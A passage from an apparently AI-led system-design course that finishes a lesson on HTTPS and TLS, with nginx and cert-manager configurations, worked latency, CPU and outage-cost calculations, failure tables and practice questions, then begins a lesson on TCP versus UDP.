    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305;
    ssl_prefer_server_ciphers off;   # let the CLIENT choose: mobile prefers ChaCha20 (no AES hardware)

    # Session resumption: cuts CPU and lets returning clients skip the full handshake.
    # 10MB of shared cache holds roughly 40,000 sessions.
    ssl_session_cache   shared:TLS:10m;
    ssl_session_timeout 1d;
    ssl_session_tickets on;
    # NOTE: ticket keys must be ROTATED (daily) and shared across all LB nodes,
    # or you silently lose forward secrecy and resumption stops working across nodes.

    # OCSP stapling: the SERVER fetches the revocation proof and attaches it, so the
    # client does not make its own round trip to the CA (privacy + latency win).
    ssl_stapling on;
    ssl_stapling_verify on;

    # HSTS. Roll max-age up gradually: 300 -> 86400 -> 604800 -> 31536000.
    # 'preload' is effectively PERMANENT -- do not add it until every subdomain is HTTPS.
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    location / {
        proxy_pass https://origin_upstream;        # https:// => RE-ENCRYPTION, not termination
        proxy_ssl_verify on;                       # verify the backend's cert; default is OFF (!)
        proxy_ssl_trusted_certificate /etc/ssl/internal-ca.pem;

        proxy_set_header X-Forwarded-Proto https;  # the app CANNOT tell otherwise (Lesson 5)
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

# Port 80 exists ONLY to redirect and to answer ACME HTTP-01 challenges.
server {
    listen 80;
    server_name booknook.com www.booknook.com;

    location /.well-known/acme-challenge/ { root /var/www/acme; }  # keep this BEFORE the redirect

    location / { return 301 https://$host$request_uri; }
}
```

Kubernetes cert-manager, showing fully automated issuance:

```yaml
apiVersion: cert-manager.io/v1
kind: Certificate
metadata:
  name: booknook-tls
spec:
  secretName: booknook-tls          # the resulting cert+key land in this Secret
  duration: 2160h                   # 90 days
  renewBefore: 720h                 # renew at day 60 -> 30 days of retry headroom.
                                    # Renewing at day 89 means ONE chance before an outage.
  dnsNames:
    - booknook.com
    - "*.booknook.com"              # wildcards REQUIRE the DNS-01 challenge
  issuerRef:
    name: letsencrypt-prod
    kind: ClusterIssuer
  privateKey:
    algorithm: ECDSA                # smaller + ~10x cheaper handshakes than RSA-2048
    size: 256
    rotationPolicy: Always          # generate a NEW key each renewal, not just a new cert
```

A client that must reject 0-RTT for unsafe methods:

```python
import httpx

# Connection pooling matters more than any TLS tuning: a reused connection
# costs ZERO handshake round trips (see the latency table in section 4.5).
client = httpx.Client(
    limits=httpx.Limits(max_keepalive_connections=100, keepalive_expiry=50.0),
    verify=True,        # NEVER set verify=False. It disables certificate validation,
                        # which removes AUTHENTICATION -- you keep encryption to an
                        # attacker. This is the single most common TLS mistake in code.
    timeout=httpx.Timeout(connect=3.0, read=10.0, write=10.0, pool=5.0),
)

# Conceptual rule for 0-RTT, which the transport layer enforces for you:
#   GET  /books/123   -> safe as early data; replay is harmless
#   POST /orders      -> NEVER as early data; a replay creates a duplicate order
```

## 9. Numerical example

**Goal:** quantify (a) the latency cost of TLS versions, (b) handshake CPU at scale, (c) the revenue impact of one expired certificate, and (d) the value of connection reuse.

**Assumptions (all stated, all typical/approximate):**
- BookNook peak traffic: **14,000 requests/second**.
- **6 %** of requests arrive on a *new* connection (first visit, idle timeout, mobile network change); 94 % reuse an existing connection.
- RTT distribution: 40 % of users at **30 ms** (same region), 45 % at **90 ms** (cross-region), 15 % at **210 ms** (mobile/intercontinental).
- ECDSA P-256 handshake CPU cost: **≈ 0.6 ms** of one core per full handshake. Resumption: **≈ 0.08 ms**.
- RSA-2048 handshake CPU cost: **≈ 2.6 ms** per full handshake (for comparison).
- **55 %** of new connections can use session resumption; 45 % require a full handshake.
- Average order value **₹1,850**; conversion rate **2.4 %**; 14,000 RPS corresponds to **620 page views/second**.
- Historical measurement: **100 ms** of added page latency reduces conversion by **≈ 0.7 %** relative.

**Part A — weighted handshake latency, TLS 1.2 vs TLS 1.3**

TLS 1.2 costs 2 RTT of handshake; TLS 1.3 costs 1 RTT. The saving per new connection is exactly 1 RTT.

```
Weighted RTT = (0.40 x 30) + (0.45 x 90) + (0.15 x 210)
             = 12.0 + 40.5 + 31.5
             = 84.0 ms
```

```
Saving per new connection (1.2 -> 1.3) = 1 x 84.0 ms = 84 ms
```

```
New connections per second = 14,000 x 0.06 = 840 /s
Latency-seconds saved per second = 840 x 0.084 s = 70.6 user-seconds per second
Per day = 70.6 x 86,400 = 6,100,000 user-seconds/day = ~1,694 user-hours/day
```

**1,694 hours of user waiting removed per day by flipping one config flag.** That is the argument for TLS 1.3 in a sentence.

**Part B — time to first byte, full comparison at the weighted 84 ms RTT**

```
Plain HTTP new connection : 1 RTT  =  84 ms
TLS 1.3 new connection    : 2 RTT  = 168 ms
TLS 1.2 new connection    : 3 RTT  = 252 ms
TLS 1.3 with 0-RTT        : 1 RTT  =  84 ms
Reused keep-alive         : 0 RTT  =   0 ms
```

```
TLS "tax" vs plain HTTP, TLS 1.3 = 168 - 84 =  84 ms
TLS "tax" vs plain HTTP, TLS 1.2 = 252 - 84 = 168 ms
```

But weight by how often it is actually paid:

```
Average handshake cost per request, TLS 1.3 = 0.06 x 84 ms = 5.04 ms
Average handshake cost per request, TLS 1.2 = 0.06 x 168 ms = 10.08 ms
```

**Because 94 % of requests reuse a connection, the real average TLS cost is ~5 ms per request, not 168 ms.** This is the number to quote when someone proposes disabling HTTPS "for performance" — the answer is five milliseconds, and it goes to near zero if you improve reuse.

**Part C — handshake CPU at scale**

```
New connections/sec                  = 840
   full handshakes  = 840 x 0.45     = 378 /s
   resumed          = 840 x 0.55     = 462 /s

ECDSA CPU/sec = (378 x 0.6 ms) + (462 x 0.08 ms)
              = 226.8 ms + 36.96 ms
              = 263.8 ms of CPU per second
              = 0.264 cores
```

```
RSA-2048 equivalent = (378 x 2.6 ms) + (462 x 0.08 ms)
                    = 982.8 + 36.96 = 1,019.8 ms/s
                    = 1.02 cores
```

```
Saving from ECDSA over RSA = 1.02 - 0.264 = 0.756 cores (a 74 % reduction)
```

**Conclusion:** TLS handshake CPU at 14,000 RPS is **about a quarter of one core** with ECDSA. The widespread belief that "TLS is expensive in CPU" is a leftover from the pre-AES-NI, RSA-only era and is quantitatively false today. State the number; do not accept the folklore.

Bulk encryption cost is likewise negligible:

```
Assume 25 KB average response x 14,000 RPS = 350 MB/s
AES-GCM with hardware acceleration: ~2 GB/s per core (approximate)
CPU for bulk encryption = 350 / 2,000 = 0.175 cores
```

**Total TLS CPU ≈ 0.44 cores out of, say, 32. About 1.4 %.**

**Part D — cost of one expired certificate**

```
Outage duration (from the incident in section 7) = 71 minutes = 4,260 seconds
Page views lost = 620 /s x 4,260 s = 2,641,200 page views
Orders lost     = 2,641,200 x 0.024 = 63,389 orders
Revenue lost    = 63,389 x Rs 1,850 = Rs 117,269,650  ~= Rs 11.7 crore
```

Even assuming **80 %** of those customers simply return later:

```
Permanently lost revenue = Rs 117,269,650 x 0.20 = Rs 23,453,930 ~= Rs 2.3 crore
```

Against that, ACME automation costs roughly one engineer-week to set up and essentially nothing to run. **The return on automating certificate renewal is not close.** This is also why expiry monitoring must be external: during the outage, the internal dashboards showed zero errors.

**Part E — the value of improving connection reuse**

Suppose better keep-alive tuning drops new-connection share from 6 % to 2 %:

```
New connections/sec = 14,000 x 0.02 = 280 /s   (down from 840)
Average handshake cost per request = 0.02 x 84 ms = 1.68 ms (down from 5.04 ms)
Latency saved per request = 5.04 - 1.68 = 3.36 ms
```

```
Page-level saving (assume 1 new connection avoided per page on average):
   84 ms removed from a page load
Conversion impact = (84 / 100) x 0.7 % = 0.588 % relative improvement

Daily orders  = 620 page views/s x 86,400 x 0.024 = 1,285,632 orders/day
Extra orders  = 1,285,632 x 0.00588 = 7,559 orders/day
Extra revenue = 7,559 x Rs 1,850 = Rs 13,984,150/day
```

The assumption to flag honestly: the 0.7 %-per-100 ms figure is an industry rule of thumb, varies enormously by business, and the "one connection avoided per page" is a simplification. But the direction and order of magnitude hold: **connection reuse is worth more than every other TLS optimisation combined**, which is exactly what the latency table in §4.5 predicted.

## 10. Trade-offs

**Advantages**
- **Confidentiality, integrity, and authentication** for a few milliseconds of average latency and ~1 % of CPU (§9).
- **Required for modern protocols and browser APIs** — HTTP/2, HTTP/3, service workers, geolocation, and more refuse to work without it.
- **Forward secrecy** by default in TLS 1.3: stolen keys do not decrypt recorded past traffic.
- **Free and automated** via ACME; the historical cost and toil arguments are gone.
- **SEO and trust signals**: search engines rank HTTPS higher; browsers actively shame plain HTTP.

**Disadvantages**
- **Extra round trips on new connections** — 1 RTT (1.3) or 2 RTT (1.2). Matters most for high-RTT mobile users on first contact.
- **Certificate lifecycle is a permanent operational commitment** with a cliff-edge failure mode.
- **Intermediaries lose visibility.** Network-level monitoring, DLP, and debugging tools cannot read traffic without being given keys or performing their own interception.
- **SNI still leaks the hostname**, so TLS is not a privacy solution on its own.
- **Key management is hard**: private keys in CI, in container images, and in backups are a recurring breach source.
- **Complexity of the PKI model**: ~150 CAs any of which can issue for your domain; CT logs are detection, not prevention.

**Operational costs**
- Certificate inventory, renewal automation, and expiry alerting across public, internal, client, and partner certificates.
- Ticket-key rotation and sharing across load-balancer nodes, or resumption silently breaks.
- Protocol and cipher policy reviews as algorithms are deprecated (SHA-1, RSA key exchange, CBC modes, and eventually today's algorithms under post-quantum migration).
- Testing cookie and redirect behaviour behind TLS termination, where the app cannot see the real scheme.

**When the complexity is not worth it**
- Localhost development loops, where self-signed certificates add friction without threat-model benefit — though note that some browser APIs you depend on only work on secure origins, so `localhost` is specially exempted.
- Inside a single process or over a Unix domain socket, where there is no network to intercept.

## 11. Failure scenarios

| Failure | What the user experiences | How it's detected | How it recovers |
|---|---|---|---|
| Certificate expires | Full-page, non-bypassable browser warning; API clients hard-fail. **Zero HTTP errors**, because no request is made | Traffic-volume collapse (not error rate); external expiry probe; user reports | Reissue and deploy; then automate with ACME and add external expiry alerting at 30/14/7 days |
| Intermediate certificate not served | Works in Chrome and Safari, fails on Android, Java, Go, and `curl` | `openssl s_client -showcerts` shows one certificate; platform-specific error reports | Deploy `fullchain.pem` (leaf + intermediate), not just the leaf |
| Client clock badly wrong | "Certificate not yet valid" or "expired" on one device only | Single-user reports; server-side everything looks healthy | Fix the device clock / NTP. Nothing server-side can help |
| `verify=False` left in code | Nothing visible — encryption still works, authentication is gone | Code review; a MITM proxy succeeding in a security test | Remove it; pin the internal CA bundle instead. Treat as a security incident |
| HSTS `preload` deployed before all subdomains have HTTPS | Internal or legacy subdomains become **completely unreachable for a year** for anyone who visited once | Sudden total failure on specific subdomains, only for returning users | Removal from the preload list takes months. Interim fix: deploy valid certificates on every affected subdomain |
| TLS ticket keys not rotated / not shared across LB nodes | Resumption silently stops working; latency rises; forward secrecy is quietly lost | Full-handshake ratio climbing in metrics; handshake CPU rising | Rotate ticket keys daily and distribute them to every node |
| Only TLS 1.0/1.1 disabled on *some* nodes | A fraction of old clients fail unpredictably depending on which node they hit | Error rate that correlates with a specific backend; inconsistent scanner results | Enforce protocol policy centrally; verify every node |
| 0-RTT enabled for non-idempotent routes | **Duplicate orders**, double charges, replayed writes | Duplicate records with identical payloads and near-identical timestamps | Restrict early data to safe methods; enforce at the edge; add `Idempotency-Key` (Lesson 17) |
| App ignores `X-Forwarded-Proto` behind a terminating LB | Infinite redirect loops; `Secure` cookies never set so login silently fails | Redirect loop reports; `Set-Cookie` missing the `Secure` flag in captures | Configure the framework's trusted-proxy setting to honour the header |
| Private key leaked into a container image or Git history | No visible symptom; an attacker can impersonate the site | Secret scanning; CT log monitoring showing unexpected certificates | **Revoke and reissue immediately**; rotate everything; audit. Forward secrecy limits damage to future sessions, not to impersonation |
| A CA mis-issues a certificate for your domain | Users are MITM'd with a valid-looking certificate | Certificate Transparency log monitoring | Report to the CA for revocation; publish a CAA record to restrict future issuance |

## 12. Alternatives

| Option | What it is | Strengths | Weaknesses | Use when |
|---|---|---|---|---|
| **TLS 1.3** | Current standard | 1-RTT, mandatory forward secrecy, few safe options | 0-RTT replay risk if misused | **The default for everything** |
| **TLS 1.2** | Previous standard | Universal compatibility | 2-RTT; permits weak configurations | Only for legacy clients you cannot drop |
| **QUIC / TLS over UDP** | TLS 1.3 built into the transport | 1-RTT or 0-RTT total; survives network changes; no TCP HOL blocking | UDP sometimes blocked; higher CPU per byte today | HTTP/3, mobile-heavy traffic (Lesson 9) |
| **mTLS** | Both sides present certificates | Strong, non-replayable identity; no bearer token to steal | Client certificate lifecycle management | Service mesh, partner APIs, device fleets |
| **VPN / WireGuard / IPsec** | Encrypts at the network layer | Protects *all* protocols, not just HTTP; hides more metadata | Operationally heavy; endpoint-to-endpoint only | Site-to-site links, admin access |
| **SSH tunnels** | Encrypted channel with key-based auth | Simple, no CA needed | Manual, point-to-point, no browser support | Operator access, ad-hoc port forwarding |
| **Application-layer encryption** | Encrypt fields before they leave the client | Server never sees plaintext; survives a server breach | No server-side search or validation; key management is brutal | End-to-end messaging, health records |
| **Noise protocol framework** | Modern, minimal handshake toolkit | Small, auditable, no PKI required | No browser support; you build the trust model | Embedded devices, custom P2P protocols |
| **Plain HTTP** | No protection | Zero overhead | No confidentiality, integrity, or authentication | Only inside a single host (loopback), never across a network |

## 13. When to use it

1. **Every public-facing endpoint, without exception.** There is no longer a cost argument: certificates are free, handshake CPU is ~1 % (§9 Part C), and browsers actively penalise plain HTTP. "It's just a marketing page with no login" ignores that an ISP can inject malware into it.
2. **Every internal service handling regulated or personal data.** Payments (PCI DSS), health records, and personal data under GDPR/DPDP all effectively require encryption in transit. Use re-encryption or mTLS rather than trusting the VPC perimeter.
3. **Any API consumed by mobile apps or partners.** Mobile devices roam across hostile networks constantly; an unencrypted API is an open invitation on every café Wi-Fi.
4. **mTLS specifically for service-to-service calls** inside a cluster, where certificate issuance can be fully automated and short-lived, giving you strong identity with no token to steal.
5. **HSTS on any site with authentication**, to close the SSL-stripping window on the first plaintext request.
6. **0-RTT specifically for safe, cacheable `GET` traffic** at the CDN edge, where saving one RTT on high-latency mobile connections is material and replay is harmless.

## 14. When *not* to use it

1. **Not on loopback within a single host.** A process talking to another process on `127.0.0.1`, or over a Unix domain socket, has no network segment to intercept; adding TLS buys nothing and costs a certificate lifecycle. (The exception is multi-tenant hosts where other tenants share the machine.)
2. **Do not enable 0-RTT for non-idempotent requests.** The replay risk is structural, not a bug to be patched. Restrict early data to `GET`/`HEAD` and enforce it at the edge.
3. **Do not use TLS passthrough when you need header-based routing, caching, WAF inspection, or cookie-based stickiness.** You cannot have both a blind load balancer and a smart one; choose based on whether compliance requires the LB to never see plaintext.
4. **Do not use public CA certificates for internal hostnames.** Internal names cannot be domain-validated, issuance is logged publicly to CT (leaking your internal topology), and lifetimes are badly matched. Run a private CA instead.
5. **Do not rely on TLS as a privacy mechanism** when the threat model includes an observer who cares *which site* you visited. SNI, IP addresses, and traffic patterns all leak. That requires a VPN, Tor, or ECH.
6. **Do not add EV certificates expecting a security or UX benefit.** Browsers removed the distinctive indicator in 2019; you are paying for a field nobody sees.

## 15. Common mistakes

**Beginner mistakes**
- Setting `verify=False`, `rejectUnauthorized: false`, or `curl -k` to "make the error go away". This removes **authentication** while keeping encryption — you are now safely encrypted to whoever is intercepting you.
- Believing the padlock means the site is trustworthy. It means the channel is private; phishing sites have valid certificates.
- Thinking HTTPS protects the data once it reaches the server, or protects against SQL injection and XSS.
- Deploying only `cert.pem` instead of `fullchain.pem`, then being baffled that Android fails while Chrome works.
- Assuming HTTPS hides which website you visited — SNI is plaintext.
- Committing a private key to Git "temporarily".
- Running `openssl s_client` without `-servername` and concluding the certificate is wrong.
- Thinking "SSL" and "TLS" are different things in 2026.

**Experienced-engineer mistakes**
- Enabling HSTS `preload` with `includeSubDomains` before auditing every subdomain, then discovering an internal tool is unreachable for a year.
- Enabling 0-RTT globally at the CDN without restricting it to safe methods, creating a duplicate-write channel.
- Not rotating or not sharing TLS session-ticket keys across load-balancer nodes, silently destroying both resumption and forward secrecy.
- Monitoring only the main public certificate, and being taken down by the certificate on a partner integration, an internal admin panel, or an mTLS client.
- Renewing at day 85 of 90 instead of day 60, leaving a single attempt before an outage.
- Terminating TLS at the LB without configuring the app to honour `X-Forwarded-Proto`, producing redirect loops and non-`Secure` cookies.
- Assuming "it's inside the VPC so it's safe" — the network perimeter is not a security boundary in a zero-trust model (Phase 4, Topic 12).
- Choosing RSA-2048 certificates by default when ECDSA P-256 gives ~74 % lower handshake CPU and smaller handshake bytes.
- Alerting only on HTTP error rate, so a TLS failure — which produces no HTTP response at all — is invisible until traffic volume collapses.
- Treating Certificate Transparency as a control rather than a detection mechanism, and skipping CAA records.

## 16. Interview perspective

TLS appears in interviews as a *correctness and operations* signal rather than a cryptography quiz. Nobody will ask you to explain elliptic curves.

- **Say "HTTPS is HTTP over TLS" explicitly.** It instantly separates you from candidates who think it is a different protocol.
- **Name the three guarantees and at least two non-guarantees.** "Confidentiality, integrity, authentication — and it does *not* hide the SNI hostname, the IP, or traffic volume, and it does not make the application secure." This is the highest-signal sentence in the whole lesson.
- **Quantify the handshake.** "TLS 1.3 is 1 RTT, 1.2 is 2 RTT. At our 84 ms weighted RTT that's an 84 ms saving per new connection — but 94 % of our requests reuse connections, so the real average cost is about 5 ms." Numbers beat adjectives.
- **Bring up certificate expiry as an availability risk, unprompted**, when asked about outages. It is one of the most common real causes and almost nobody mentions it. Add: "and TLS failures are invisible to HTTP error-rate alerts, so we alert on traffic-volume drop too."
- **Know the termination patterns.** When you draw a load balancer, say which of terminate / re-encrypt / passthrough you chose and why — compliance, WAF inspection, or cost.
- **Mention mTLS for service-to-service**, with the honest caveat that certificate distribution is the hard part and a service mesh exists to solve it.
- **Explain 0-RTT's replay risk in one line** and tie it to idempotency: "early data is replayable, so only safe methods." That links Lessons 6, 7, and 17 in a single sentence, which is exactly the kind of connection interviewers reward.

**Red flags interviewers watch for**
- Thinking HTTPS prevents SQL injection, XSS, or data breaches.
- Suggesting `verify=False` or `-k` as a fix for a certificate problem.
- Believing TLS hides which website you visited.
- Not knowing certificates expire, or having no automated renewal story.
- Confusing encryption with authentication, or not knowing why authentication is the part that stops MITM.
- Proposing to "turn off HTTPS internally for performance" without any CPU or latency numbers.
- Being unable to say where TLS is terminated in their own system.
- Treating EV certificates as a security measure.

## 17. Knowledge check

**Conceptual**

1. A colleague says: "We're fully HTTPS with an A+ rating on the SSL test site, so user data is secure and we don't need to encrypt the database." Identify every incorrect inference in that sentence. Then list, precisely, four things an observer sitting on the network path can still determine about a user's session despite perfect TLS, and explain for each one *why* TLS cannot hide it.
2. Explain why TLS uses both asymmetric and symmetric cryptography rather than just one, naming which job each does and why swapping them would be impractical. Then explain what *forward secrecy* means and why TLS 1.3 removing RSA key exchange was a security improvement rather than a compatibility regression.
3. BookNook enables TLS 1.3 0-RTT at its CDN to reduce mobile latency. Explain the specific property of 0-RTT that makes it unsafe for some requests, name exactly which HTTP methods from Lesson 6 are safe to send as early data and why, and describe one server-side control that limits the damage if an attacker replays early data anyway.

**Practical scenario**

4. At 03:00 BookNook's mobile app begins failing for 100 % of users. The web dashboard shows **zero** HTTP 5xx errors and normal CPU. The web site works fine in the on-call engineer's browser. Requests per second on the API has dropped by 94 %. Walk through your diagnosis: what do you suspect first, what three commands or checks do you run, why does the browser work when the mobile app does not, and what are the two monitoring changes you implement afterwards so this class of failure is detected within 60 seconds rather than 22 minutes?

**Calculation**

5. BookNook expands to a new region. Peak traffic there is **22,000 requests/second**, of which **9 %** arrive on a new connection. The RTT mix is 30 % at 25 ms, 50 % at 110 ms, and 20 % at 240 ms. Assume ECDSA full handshakes cost **0.6 ms** of CPU and resumed handshakes cost **0.08 ms**, with **60 %** of new connections resuming. Average response size is **30 KB**, and AES-GCM runs at **2 GB/s per core**.
   (a) What is the weighted average RTT, and how many milliseconds does moving from TLS 1.2 to TLS 1.3 save per new connection?
   (b) How many user-hours of waiting per day does that upgrade eliminate?
   (c) How many CPU cores are consumed by handshakes, and how many by bulk encryption? What percentage of a 64-core fleet is that in total?
   (d) If a configuration error raises the new-connection rate from 9 % to 35 %, recompute the average per-request handshake latency cost before and after, and state how many additional cores the handshakes now consume. Show every step and state every assumption you add.

Reply with your answers and I'll assess them, correct anything shaky, and give model answers before Lesson 8.

---

**Progress checklist**

Phase 1:
- `[x] 1. Client-server architecture`
- `[x] 2. Stateful versus stateless servers`
- `[x] 3. IP addresses, ports, sockets, domain names`
- `[x] 4. DNS resolution and DNS caching`
- `[x] 5. HTTP requests and responses`
- `[x] 6. HTTP methods, headers, cookies, sessions, status codes`
- `[x] 7. HTTPS and TLS`
- `[ ] 8. TCP versus UDP`
- `[ ] 9. HTTP/1.1 vs HTTP/2 vs HTTP/3`
- `[ ] 10. REST APIs`
- `[ ] 11. RPC and gRPC`
- `[ ] 12. GraphQL`
- `[ ] 13. Synchronous versus asynchronous communication`
- `[ ] 14. Latency, throughput, bandwidth, concurrency`
- `[ ] 15. Availability, reliability, durability, fault tolerance`
- `[ ] 16. Average latency vs p50/p95/p99, tail latency`
- `[ ] 17. Idempotency, retries, timeouts, exponential backoff`

**NEXT LESSON: Phase 1, Topic 8 — TCP versus UDP**

---

# Lesson 8 — TCP versus UDP

*Phase 1, Topic 8*

## 1. Simple definition

Lesson 3 gave you IP addresses and ports. IP by itself only promises to *try* to move a packet from one machine to another — packets can be lost, duplicated, reordered, or delayed arbitrarily. **Transport protocols sit on top of IP and decide what to do about that.** There are two that matter.

**TCP (Transmission Control Protocol)** turns the unreliable packet service into a **reliable, ordered, byte stream** between two programs. If you write 10 bytes and then 90 bytes, the other side receives those 100 bytes, in order, with nothing missing and nothing duplicated — or the connection fails loudly. TCP achieves this with sequence numbers, acknowledgements, retransmission, and flow/congestion control.

**UDP (User Datagram Protocol)** adds almost nothing to IP: just ports and an optional checksum. You hand it a **datagram** (a self-contained message) and it tries once. No ordering, no retransmission, no connection, no congestion control. It may arrive, arrive twice, or arrive after the one you sent later.

Terms defined before use:

- A **packet** is the generic unit travelling over IP.
- A **TCP segment** is TCP's unit; it is a *slice of a byte stream*, and segment boundaries are **meaningless** to the application.
- A **UDP datagram** is UDP's unit; it is a *message*, and its boundaries are **preserved exactly**.
- **RTT (round-trip time)** is how long a packet takes to reach the peer and its reply to return.
- **MTU (Maximum Transmission Unit)** is the largest packet a network link carries without fragmentation — typically **1,500 bytes** on Ethernet, leaving an **MSS (Maximum Segment Size)** of about **1,460 bytes** of TCP payload.

The one-line summary: **TCP trades latency for reliability; UDP trades reliability for control.**

## 2. Why it exists

The internet's core (IP) was deliberately built to be *dumb and best-effort*. Routers forward packets and drop them when queues are full. That design is why the internet scales — routers hold no per-connection state.

But applications want very different things from that substrate:

1. **A file transfer or an HTTP response must be perfect.** One missing byte in a JSON payload or a JPEG is a corrupt result. Reliability must exist *somewhere*. Putting it in the application means every application reimplements it — badly. TCP puts it in the OS kernel, once, correctly.
2. **A voice call must be timely.** If a 20 ms audio sample is lost, retransmitting it takes at least one RTT — by which time it is useless, because that moment of speech has passed. You want the *next* sample, not the old one. Reliability here actively *harms* the application.
3. **A DNS lookup is a single tiny question and answer.** Paying a 3-way handshake, a teardown, and connection state for 60 bytes of data is absurd overhead (Lesson 4).

So the internet offers both: **TCP for "every byte matters", UDP for "timeliness matters more than completeness, or I want to build my own rules".** UDP's real modern value is not "unreliable" — it is **"programmable"**: it is a blank transport on which you can build exactly the reliability you need, in user space, shipping with your application instead of waiting a decade for kernels to update. That is precisely what QUIC does.

## 3. Real-world analogy

**TCP is a registered courier service. UDP is shouting across a crowded room.**

TCP, in detail:
- You phone ahead to confirm the recipient is there and ready (**handshake**).
- Every parcel is **numbered** so the recipient can put them in order.
- The recipient **signs for each one** (acknowledgement). If no signature returns in time, you send it again (**retransmission**).
- The recipient can say "my doorstep is full, stop for now" (**flow control**).
- If the roads are congested, you deliberately **slow down** to avoid gridlock (**congestion control**).
- At the end, both sides formally agree the shipment is finished (**FIN teardown**).

UDP, in detail:
- You shout a sentence across the room. If they heard it, good. If not, you will never know.
- No setup, no confirmation, no ordering, no slowing down for anyone.
- Shouting a second sentence does not wait for the first to be understood.

**Where the analogy breaks down**

| Courier / shouting | Real TCP / UDP |
|---|---|
| A courier parcel stays one parcel | TCP is a **byte stream**: your 100-byte `send()` may arrive as 40 + 60, or be merged with the next message. **TCP has no message boundaries** — this is the #1 practical surprise |
| A signature proves the recipient *read* it | A TCP ACK means the **kernel** received it, not that the application processed it. The app can crash after the ACK and before handling the data — Lesson 1's ambiguity problem |
| Slowing down is a courtesy | Congestion control is **mandatory and automatic**, and it is the only reason the internet does not collapse. UDP applications that ignore it are genuinely antisocial |
| One blocked parcel delays only itself | **Head-of-line blocking**: one lost TCP segment stalls *every* byte behind it, even bytes that already arrived safely |
| Shouting costs nothing | UDP senders must implement their own rate limiting, or they cause congestion collapse and get their traffic throttled by networks |
| Hanging up ends the call | After closing, a TCP socket sits in **TIME_WAIT for ~60 seconds**, still consuming a port (§4.7) |

## 4. Detailed technical explanation

### 4.1 Segments versus datagrams — the framing difference that bites everyone

| | TCP segment | UDP datagram |
|---|---|---|
| Application sees | A continuous **byte stream** | Discrete **messages** |
| Boundaries preserved | **No** | **Yes** — one `send()` = one `recv()` |
| Header size | 20–60 bytes | **8 bytes** |
| Max payload | Unbounded (stream) | 65,507 bytes theoretical; **keep under ~1,400** in practice to avoid IP fragmentation |
| Reorders fixed | Yes | No |
| Duplicates removed | Yes | No |
| Loss repaired | Yes | No |

The consequence of "no boundaries" is the most common networking bug in application code. If you `send(b"HELLO")` then `send(b"WORLD")`, the peer may `recv()` exactly once and get `b"HELLOWORLD"`, or get `b"HEL"` then `b"LOWORLD"`. **TCP guarantees order and completeness; it guarantees nothing about chunking.** That is precisely why HTTP needs `Content-Length` or chunked encoding (Lesson 5, §4.3) — the application must define its own message framing on top of the stream. Every protocol over TCP does this: length prefixes, delimiters, or both.

UDP has the opposite property: boundaries are perfect, but delivery is not. You get the whole message or nothing — never half.

### 4.2 The three-way handshake and its RTT cost

Before any data moves, TCP establishes shared state on both sides.

```
Client                                      Server
  |                                           |  (listening)
  |---- SYN  seq=x -------------------------->|   "let's talk; my byte numbering starts at x"
  |<--- SYN-ACK  seq=y, ack=x+1 --------------|   "ok; mine starts at y; I got yours"
  |---- ACK  ack=y+1 ------------------------>|   "I got yours"
  |---- data --------------------------------->|   <- data can ride along with this ACK
```

`SYN` means *synchronise*: it carries the sender's **initial sequence number (ISN)**, which is randomised specifically to prevent off-path attackers from guessing it and injecting data.

**Cost accounting.** The client can send data immediately after sending the third packet, so from the client's perspective the handshake costs **1 RTT** before the first byte of application data. Then add TLS from Lesson 7:

| | Round trips before first HTTP byte | At 30 ms RTT | At 90 ms RTT | At 240 ms RTT |
|---|---|---|---|---|
| TCP only (plain HTTP) | 1 | 30 ms | 90 ms | 240 ms |
| TCP + TLS 1.3 | 2 | 60 ms | 180 ms | 480 ms |
| TCP + TLS 1.2 | 3 | 90 ms | 270 ms | 720 ms |
| QUIC (UDP + TLS 1.3 merged) | 1 | 30 ms | 90 ms | 240 ms |
| QUIC 0-RTT | 0 | 0 ms | 0 ms | 0 ms |
| Reused connection | 0 | 0 ms | 0 ms | 0 ms |

This table is the entire motivation for both connection pooling (Lesson 5) and HTTP/3 (Lesson 9).

A related production hazard: the **SYN backlog**. Completed-but-not-yet-`accept()`ed connections sit in a kernel queue (Lesson 1's `listen(128)`). If your application is too slow to accept, the queue overflows and the kernel **silently drops SYNs**. The client sees a connection timeout, not a rejection, so it waits the full timeout and then retries. Monitor `netstat -s | grep -i listen` for "SYNs to LISTEN sockets dropped".

### 4.3 Sequence numbers, ACKs, and retransmission

Every byte in a TCP stream has a **sequence number**. The receiver acknowledges with the **next byte it expects** (a cumulative ACK): `ack=5001` means "I have everything up to byte 5000."

Loss is detected two ways:

1. **Timeout (RTO — Retransmission Timeout).** The sender keeps a smoothed estimate of RTT and its variance, and sets `RTO ≈ SRTT + 4 × RTTVAR`, with a floor (commonly 200 ms–1 s). If no ACK arrives in time, retransmit and **double the RTO** (exponential backoff — the same idea as Lesson 17). The initial RTO before any sample is **1 second**, so the *first* packet of a connection being lost costs a full second. This is why a single dropped SYN produces a conspicuous 1-second or 3-second stall.
2. **Fast retransmit (3 duplicate ACKs).** If segments 1, 2, 4, 5, 6 arrive, the receiver ACKs "expecting 3" four times. After the third *duplicate* ACK the sender concludes segment 3 was lost and retransmits immediately — without waiting for the timeout. This is far cheaper, roughly 1 RTT instead of an RTO.

**SACK (Selective Acknowledgement)** is an extension where the receiver reports exactly which ranges arrived ("I have 1–2 and 4–6"), so the sender retransmits only the missing piece rather than everything from the gap onward. It is enabled essentially everywhere and matters enormously on lossy links.

The crucial consequence: **loss costs latency, not just bandwidth.** A 1 % loss rate does not mean "1 % slower"; it means some requests pay an extra RTT (fast retransmit) or an extra second (RTO), which shows up in your **p99 latency** (Lesson 16 — average latency vs p50/p95/p99, tail latency), not your average.

### 4.4 Flow control versus congestion control

These are routinely conflated. They solve **different problems with different mechanisms**, and knowing the difference is a reliable interview differentiator.

| | **Flow control** | **Congestion control** |
|---|---|---|
| Protects | The **receiver** from being overwhelmed | The **network** from being overwhelmed |
| Mechanism | `rwnd` — the receive window, advertised in every ACK header | `cwnd` — the congestion window, a *sender-side estimate*, never transmitted |
| Signal | Explicit: "I have 64 KB of buffer left" | Implicit: packet loss, or rising delay |
| Failure without it | Receiver's buffer overflows, data dropped | Queues everywhere fill, mass loss, **congestion collapse** |
| Who computes it | The receiver | The sender |

The sender may have at most **`min(rwnd, cwnd)`** bytes unacknowledged in flight at any moment.

